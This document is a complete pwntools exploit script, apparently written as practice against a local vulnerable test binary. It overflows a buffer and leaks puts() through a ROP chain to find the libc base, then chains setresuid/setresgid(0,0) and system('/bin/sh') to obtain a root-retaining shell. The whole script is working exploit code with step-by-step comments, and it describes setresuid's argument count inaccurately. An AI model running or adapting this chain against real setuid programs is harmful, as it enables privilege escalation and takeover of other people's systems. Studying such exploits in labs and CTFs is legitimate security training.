#!/usr/bin/python
from pwn import * # Imports all the required pwntools module

offset = 140 # pattern_offset 0x41416d41
control_eip = p32(0xdeadbeef) # Custom value to overwrite EIP with
exe_name = "/home/tao/test/nx_vuln" # Path to vulnerable program
main_addr = p32(0x80491da) # The address that signify the start of the program
libc = ELF("/usr/lib32/libc-2.29.so") # Path to libc
elf = ELF(exe_name) # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

puts_plt = p32(0x8049050) # To call puts function
puts_got = p32(0x804c014) # Will house the address of puts() in libc during runtime

# It means puts(puts_got) which will leak puts() address in libc
rop_leak = puts_plt # Calling function
rop_leak += main_addr # When calling function exits, main program is called again
rop_leak += puts_got # Argument to calling function

bof = "A" * offset # Filling the buffer with 'A' and stops just before EIP
bof += rop_leak

p = process(exe_name) # Runs the vulnerable program
p.recvline() # Skips 'Enter something : '

raw_input(str(p.proc.pid)) # For use in GDB peda

p.sendline(bof) # Sends buffer overflow string to the program
reply = p.recv() # The reply we received from the program
reply = reply.strip() # Removes whitespace

# Find the leaked address after a string of 'A's and before
# the string 'Enter' which is displayed when the program loops again
leak = reply[reply.rfind('A') +14 :  reply.find('Enter') -5]
leakAddr = u32(leak) # Unpacks binary data into a readable string
libc_base = leakAddr - libc.sym["puts"] # Calculates libc base address
setresuid = libc_base + libc.sym["setresuid"] # Calculates setresuid() address in libc
setresgid = libc_base + libc.sym["setresgid"] # Calculates setresgid() address in libc
system = libc_base + libc.sym["system"] # Calculates system() address in libc
binSH_offset = next(libc.search('/bin/sh\x00')) # Finds "/bin/sh" string offset in libc
binSH = libc_base + binSH_offset # Calculates "/bin/sh" string address in libc
popPopRet = (rop.find_gadget(['pop edi','pop ebp','ret']))[0] # Find address of pop pop ret in program

log.success('Leaked puts() : 0x%x' %leakAddr)
log.success('Libc base : 0x%x' %libc_base)
log.success('setresuid() : 0x%x' %setresuid)
log.success('setresgid() : 0x%x' %setresgid)
log.success('system() : 0x%x' %system)
log.success('/bin/sh : 0x%x' %binSH)
log.success('pop pop ret : 0x%x' %popPopRet)

rop_retainPriv = p32(setresuid) # setresuid(0,0)
rop_retainPriv += p32(popPopRet) # Cleans 2 arguments below
rop_retainPriv += p32(0x0) # First Argument
rop_retainPriv += p32(0x0) # Second Argument

rop_retainPriv += p32(setresgid) # setresgid(0,0)
rop_retainPriv += p32(popPopRet) # Cleans 2 arguments below
rop_retainPriv += p32(0x0) # First Argument
rop_retainPriv += p32(0x0) # Second Argument

rop_Shell = p32(system) # system("/bin/sh")
rop_Shell += '\xCC' * 4 # Not a clean return unless we have pop ret and exit(0)
rop_Shell += p32(binSH) # First argument

bof = "A" * offset + rop_retainPriv + rop_Shell # Final payload
p.sendline(bof) # Sends final payload and pop shell

p.interactive() # Pass control back to user
